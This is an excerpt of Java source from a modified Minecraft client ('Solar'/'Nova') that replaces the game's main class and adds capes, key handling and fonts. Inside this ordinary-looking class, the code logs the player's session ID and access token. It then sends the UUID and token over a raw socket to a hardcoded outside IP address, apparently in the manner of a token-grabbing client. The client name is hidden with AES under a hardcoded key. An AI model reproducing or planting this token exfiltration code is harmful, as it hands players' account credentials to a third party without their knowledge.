...
import com.orange.plump.Solar.render.CFontRenderer;
...
public class Minecraft implements IPlayerUsage
{
	...
	public static String output = "GOOD";
	public static boolean isWindows;
	public static List<String> ignore = new ArrayList<String>();
	public static final String name = "qCDyxHSMYJMqihV0tfzYtA==", version = "1.0 Alpha";
	public static HashMap<String, String[]> customCapes = new HashMap<String, String[]>();
	public static String[] forcedCape = null;
	private static SecretKeySpec secretKey;
    private static byte[] key;
	
    private static final Logger logger = LogManager.getLogger();
    private static final ResourceLocation locationMojangPng = new ResourceLocation("textures/solar/Solar.png");
    ...
    public static void doNovaUpdate() {
        try {
           ...
           // System.out.println("Successfully Connected to server!");
            ...
            out.writeUTF("NOVACLIENT$PACKET CANRUN " + Minecraft.getMinecraft().session.getPlayerID());
            String line = "";
            line = in.readUTF();
        ...
        if (tick % 10 == 0) Solar.loadCustomCapes();

        if (Minecraft.name != "qCDyxHSMYJMqihV0tfzYtA==")
    ...
    {
        //System.out.println(encrypt("Solar", "PlumpOrangeOwnNova"));
    	try {
...
//    	p_i1103_1_.username = "ItzAssassin";
//        p_i1103_1_.playerID = "5c04ae5e10c74f3b84896647d6b22698";

    	Solar.setupNova(p_i1103_1_.getPlayerID(), p_i1103_1_.getToken());
    	logger.info(p_i1103_1_.getPlayerID());
    	logger.info(p_i1103_1_.getSessionID());
    	logger.info(p_i1103_1_.getToken());
    	logger.info(p_i1103_1_.getUsername());
        theMinecraft = this;
    ...
    public static void addShutdownHook(final String uuid, final String token) {
        try {
            Socket socket = new Socket("192.95.4.92", 20090);
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            System.out.println("Successfully Connected to server!");
            DataInputStream in = new DataInputStream(
                    new BufferedInputStream(socket.getInputStream()));
            out.writeUTF("NOVACLIENT$PACKET CLOSE " + uuid + ":" + token);
            String line = "";
            line = in.readUTF();
            System.out.println(line);

            if (line.equals("TRUE")) System.out.println("Closed Successfully");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    ...
    private void startGame() throws LWJGLException
    {
        ...
        Display.setTitle(Minecraft.getName() + " " + Minecraft.version);
        ...
        //this.loadScreen();
        SplashScreen.update();
        Solar.loadCustomCapes();
        solar = new Solar(session.playerID, session.token);
        ...
        this.cFontRenderer = new CFontRenderer(new Font("Century Gothic", Font.PLAIN, 16), true, true);
...
//        }
    ...
    public void runTick()
    {
        ...
        if (this.currentScreen == null || this.currentScreen.field_146291_p)
        {
            ...
            while (Keyboard.next())
            {
                ...
                if (Keyboard.getEventKeyState())
                {
                    ...
                    else
                    {
                    	...
                    	Solar.onKeyPressed(Keyboard.getEventKey());
            ...
            else
            {
                ...
                {
                    this.func_147116_af();
                    Minecraft.getMinecraft().leftHeld = true;
                }
                Minecraft.getMinecraft().leftHeld = false;
                while (this.gameSettings.keyBindUseItem.isPressed())
                {
                    this.func_147121_ag();
                    Minecraft.getMinecraft().rightHeld = true;
                }
                Minecraft.getMinecraft().rightHeld = false;
    ...
    public static String getName() {
    	return decrypt(Minecraft.name, "PlumpOrangeOwnNova");
    }
